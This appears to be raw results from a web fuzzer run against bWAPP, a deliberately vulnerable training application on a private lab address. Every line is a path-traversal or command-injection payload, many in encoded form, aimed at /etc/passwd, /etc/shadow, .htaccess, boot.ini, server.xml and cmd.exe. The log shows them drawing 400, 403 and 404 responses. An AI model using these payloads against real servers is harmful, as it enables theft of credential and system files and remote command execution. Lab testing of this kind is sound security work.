14,400,10L,42W,http://10.0.2.4/bWAPP/%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39
15,400,10L,42W,http://10.0.2.4/bWAPP/%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39
16,400,10L,42W,http://10.0.2.4/bWAPP/%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39
17,400,10L,42W,http://10.0.2.4/bWAPP/%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39
32,400,10L,42W,http://10.0.2.4/bWAPP/../../../../../../../../../etc/passwd
33,400,10L,42W,http://10.0.2.4/bWAPP/../../../../../../../../etc/passwd
34,400,10L,42W,http://10.0.2.4/bWAPP/../../../../../../../etc/passwd
35,400,10L,42W,http://10.0.2.4/bWAPP/../../../../../../etc/passwd
36,400,10L,42W,http://10.0.2.4/bWAPP/../../../../../etc/passwd
38,400,10L,42W,http://10.0.2.4/bWAPP/../../../etc/passwd
37,400,10L,42W,http://10.0.2.4/bWAPP/../../../../etc/passwd
47,400,10L,42W,http://10.0.2.4/bWAPP/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34
48,400,10L,42W,http://10.0.2.4/bWAPP/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34
49,400,10L,42W,http://10.0.2.4/bWAPP/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34
50,400,10L,42W,http://10.0.2.4/bWAPP/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34
51,400,10L,42W,http://10.0.2.4/bWAPP/../../../.htaccess
52,400,10L,42W,http://10.0.2.4/bWAPP/../../.htaccess
62,400,10L,42W,http://10.0.2.4/bWAPP/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33
61,400,10L,42W,http://10.0.2.4/bWAPP/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33
65,400,10L,42W,http://10.0.2.4/bWAPP/%%32%65%%32%66%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33
67,400,10L,42W,http://10.0.2.4/bWAPP/../../../../../../../../../../../../etc/hosts
68,400,10L,42W,http://10.0.2.4/bWAPP/../../boot.ini
64,400,10L,42W,http://10.0.2.4/bWAPP/%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33
63,400,10L,42W,http://10.0.2.4/bWAPP/%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33
71,400,10L,42W,http://10.0.2.4/bWAPP/../../../../../../../../../../../../etc/passwd
73,400,10L,42W,http://10.0.2.4/bWAPP/../../../../../../../../../../../../etc/shadow
76,400,10L,42W,http://10.0.2.4/bWAPP//../../../../../../../../../../etc/passwd
74,400,10L,42W,http://10.0.2.4/bWAPP//../../../../../../../../../../etc/passwd^^
75,400,10L,42W,http://10.0.2.4/bWAPP//../../../../../../../../../../etc/shadow^^
77,400,10L,42W,http://10.0.2.4/bWAPP//../../../../../../../../../../etc/shadow
102,400,10L,42W,http://10.0.2.4/bWAPP//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
103,400,10L,42W,http://10.0.2.4/bWAPP//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
106,400,10L,42W,http://10.0.2.4/bWAPP/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%
110,400,10L,42W,http://10.0.2.4/bWAPP/../../../../../../../../conf/server.xml
111,400,10L,42W,http://10.0.2.4/bWAPP//../../../../../../../../bin/id|
119,400,10L,42W,http://10.0.2.4/bWAPP/../../../../../../../../../../../../boot.ini
117,400,10L,42W,http://10.0.2.4/bWAPP/../../../../../../../../../../../../localstart.asp
122,400,10L,42W,http://10.0.2.4/bWAPP//../../../../../../../../../../../boot.ini
132,400,10L,42W,http://10.0.2.4/bWAPP//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
53,403,10L,37W,http://10.0.2.4/bWAPP/../.htaccess
55,403,10L,37W,http://10.0.2.4/bWAPP/././.htaccess
54,403,10L,37W,http://10.0.2.4/bWAPP/.htaccess
59,403,10L,37W,http://10.0.2.4/bWAPP/%2e%68%74%61%63%63%65%73%73
13,404,9L,39W,http://10.0.2.4/bWAPP/%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
18,404,9L,39W,http://10.0.2.4/bWAPP/..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
19,404,9L,39W,http://10.0.2.4/bWAPP/..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
20,404,9L,39W,http://10.0.2.4/bWAPP/..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
21,404,9L,39W,http://10.0.2.4/bWAPP/..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
22,404,9L,39W,http://10.0.2.4/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
23,404,9L,39W,http://10.0.2.4/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
24,404,9L,39W,http://10.0.2.4/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
25,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
26,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
